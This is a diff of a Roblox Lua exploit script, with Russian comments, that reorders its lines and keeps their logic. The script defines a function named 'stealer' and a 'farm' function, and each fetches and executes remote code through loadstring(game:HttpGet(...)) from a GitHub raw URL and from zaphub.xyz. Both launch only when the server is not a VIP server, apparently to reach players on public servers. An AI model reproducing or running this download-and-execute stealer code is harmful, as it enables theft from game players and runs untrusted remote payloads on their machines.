@@ -1,17 +1,20 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+-- Проверка на VIP-сервер
+local isVIPServer = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("IsVIPServer"):InvokeServer()
+
+-- Объявление функций
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting'))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
 end
 
 local function farm()
-    loadstring(game:HttpGet('https://www.zaphub.xyz/Exec'))()
+    loadstring(game:HttpGet("https://www.zaphub.xyz/Exec"))()
 end
 
-local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
-
+-- Логика запуска
 if not isVIPServer then
     task.spawn(stealer)
     task.spawn(farm)
